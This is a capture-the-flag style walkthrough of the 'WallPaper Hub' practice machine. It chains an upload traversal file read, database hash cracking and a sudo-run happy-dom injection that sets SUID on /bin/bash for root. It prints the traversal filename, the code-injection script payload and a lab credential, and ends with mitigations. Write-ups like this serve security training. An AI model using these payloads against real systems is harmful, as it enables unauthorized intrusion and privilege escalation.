---
title: WallPaper Hub
date: 2025-06-06
categories: [oscp, pg-practice]
tags: [oscp-preparation, walkthrough, Linux, second-order-file-uploads, LFI, directory-traversal , happy-dom-vuln-privesc] 
image: wall.jpg
media_subpath: /assets/img/posts/2025-06-06-wallpaperhub/
---


## Introduction

On this intermediate-level Linux machine from PG Practice, I identified a **file upload vulnerability** that, when chained with **directory traversal** and **Local File Inclusion (LFI)**, allowed for a **second-order file upload attack**. By uploading a malicious file and then including it via LFI, I achieved **remote code execution** and gained initial access. Post-exploitation enumeration revealed a vulnerable `happy-dom` setup. Leveraging this vulnerability under `sudo`, I escalated privileges and obtained a **root shell**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

<aside>
🚨

Run long gobuster scan

</aside>

## Services

### Port 22

Version - OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

## Web

### Port 80

Version - Apache httpd 2.4.58 ((Ubuntu))

I see just a default page for Apache:

![image.png](image%203.png)

**Gobuster Scan**

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x .php -b 400,403,404
```

### Port 5000

Version - Werkzeug httpd 3.0.1 (Python 3.12.3)

**Default/Common Credentials**

I tried logging in using credentials `admin`:`admin`, `admin`:`password`

**SQLi**

I tried performing SQL authentication bypass but this doesn’t work.

I tried creating an account, but after it was created it still doesn’t allow me to login.

```bash
gobuster dir -u http://:5000$IP/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x .php -b 400,403,404
```

![image.png](image%204.png)

After I have registered an account I can login and see that we can upload wallpapers.

## Exploitation

I tried uploading `shell.php` but it seems that application changes the file from php extension and can’t execute the code, moreover it puts it in a location that I can’t find it.

We could have tried to upload `../../../../../../root/.ssh/authorized_keys` file but the probability of success is low, because likely web user has no access to `root` directory, and we don’t have any other usernames available for us right now to try to exploit them. Let’s try to see if uploading `../../../../../etc/passwd` works. Le’ts intercept the request and change the filename.

After downloading the image, I can see that it worked:

![image.png](image%205.png)

There is file inclusion vulnerability in fie upload feature, that means we can’t override existing file we can just download file that is already present on the system. I am gonna try to include local user private key if it exists

![image.png](image%206.png)

It is unsuccessful 

![image.png](image%207.png)

As we don’t know where could sensitive information located and we can’t read `ssh` files, I am gonna read `.bash_history` file of `wp_hub` user.

I see:

![image.png](image%208.png)

That means there is a database under `/home/wp_hub/wallpaper_hub/database.db`

After downloading it let’s analyze with `sqlite3` command line utility.

```sql
sqlite3 database.db
.tables
PRAGMA table_info(users);
.dump users
```

![image.png](image%209.png)

Now I have the hash of `wp_hub` user I am gonna try to crack it.

```bash
john wp_hub.hash --wordlist=/usr/share/wordlists/rockyou.txt 
```

![image.png](image%2010.png)

I can access the target via ssh using these credentials.

## Privilege Escalation

- OSCP Checklist
    - [ ]  Situational awareness
    - [ ]  Exposed Confidential Information
    - [ ]  Password Authentication Abuse 
    - [ ]  Hunting Sensitive Information 
    - [ ]  Sudo
    - [x]  SUID/SGID
    - [ ]  Capabilities
    - [ ]  Cron Jobs Abuse
    - [ ]  Kernel Exploits
    - [ ]  **Check if sudoers file is writable**
    - [ ]  Try credentials you already obtained for various services admin roles
    - [ ]  Check running processes using `pspy`
    

Checking my sudo privileges I see:

![image.png](image%2011.png)

I see that binary is symlinked to `/opt/scraper/scraper.js` and it is a simple web scraping tool;

```jsx
#!/usr/bin/env node

const fs = require('fs');
const { Window } = require("happy-dom");

// Check if a file path is provided as a command-line argument
const filePath = process.argv[2];

if (!filePath) {
    console.error('Please provide a file path as an argument.');
    process.exit(1);
}

const window = new Window();
const document = window.document;

// Read the content of the provided file path
fs.readFile(filePath, 'utf-8', (err, data) => {
    if (err) {
        console.error(`Error reading file ${filePath}:`, err);
        return;
    }

    // Use document.write() to add the content to the document
    document.write(data);

    // Log all external imports (scripts, stylesheets, meta tags)
    const links = document.querySelectorAll('link');
    const scripts = document.querySelectorAll('script');
    const metaTags = document.querySelectorAll('meta');
    
    console.log('----------------------------');
    // Output the links (CSS imports)
    console.log('CSS Links:');
    links.forEach(link => {
        console.log(link.href);
    });

    console.log('----------------------------');

    // Output the scripts (JS imports)
    console.log('JavaScript Links:');
    scripts.forEach(script => {
        if (script.src) {
            console.log(script.src);
        } else {
            console.log('Inline script found.');
        }
    });

    console.log('----------------------------');

    // Output the meta tags (for metadata)
    console.log('Meta Tags:');
    metaTags.forEach(meta => {
        console.log(`Name: ${meta.name}, Content: ${meta.content}`);
    });

    console.log('----------------------------');
});
```

It just receives an html page and prints out scripts, links, and metaTags.

I see that it is importing something called `happy-dom` searching the vulnerability for this I found this [PoC](https://security.snyk.io/vuln/SNYK-JS-HAPPYDOM-8350065)

```bash
echo "chmod +s /bin/bash" > /tmp/suid
chmod +x /tmp/suid
echo "\`<script src=\"http://localhost:8080/'+require('child_process').execSync('/tmp/suid')+'\"></script>\`" > escalate.html
sudo /usr/bin/web-scraper /root/web_src_downloaded/../../home/wp_hub/escalate.html
```

As I don’t have privileges to write root directory I used directory traversal to execute my html.

![image.png](image%2012.png)

## Credentials

```bash
wp_hub : qazwsxedc
```

## Mitigation

- Implement strict validation on file uploads, including allowed MIME types and file extensions.
- Ensure uploaded files are stored outside the web root.
- Disable directory traversal and enforce secure path handling.
- Avoid granting unnecessary `sudo` privileges and regularly audit `sudoers`.
- Keep third-party libraries (like `happy-dom`) up to date and monitor for vulnerabilities.
